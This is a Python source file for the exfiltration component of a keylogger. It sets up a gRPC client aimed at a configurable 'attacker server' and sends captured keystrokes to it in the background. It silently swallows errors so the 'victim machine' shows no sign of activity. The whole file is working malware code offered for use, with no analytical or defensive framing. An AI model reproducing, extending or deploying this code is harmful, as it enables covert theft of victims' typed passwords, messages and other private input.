import grpc
from .protos import server_pb2 as keylog_pb2
from .protos import server_pb2_grpc as keylog_pb2_grpc

# ── Runtime-configurable connection settings ──────────────────────────────────
_host = "127.0.0.1"
_port = 50051
_stub = None   # rebuilt whenever configure() is called


def configure(host: str, port: int):
    """
    Point the gRPC client at a specific attacker server.
    Call this once at payload startup before the keylogger runs.

    Example:
        import cln
        cln.configure("192.168.1.10", 50051)
    """
    global _host, _port, _stub
    _host = host
    _port = int(port)
    channel = grpc.insecure_channel(f"{_host}:{_port}")
    _stub = keylog_pb2_grpc.KeylogServiceStub(channel)


def _ensure_stub():
    """Lazy-initialize stub on first use (default host/port)."""
    global _stub
    if _stub is None:
        channel = grpc.insecure_channel(f"{_host}:{_port}")
        _stub = keylog_pb2_grpc.KeylogServiceStub(channel)


def send_key_non_blocking(text: str):
    """
    Send a keystroke string to the attacker gRPC server WITHOUT blocking.
    Uses whatever host/port was set by configure() (or the default).

    Args:
        text: the message to transmit (key + context info)
    """
    try:
        _ensure_stub()
        _stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=text))
    except Exception:
        # Silently swallow — victim machine must not surface gRPC errors
        pass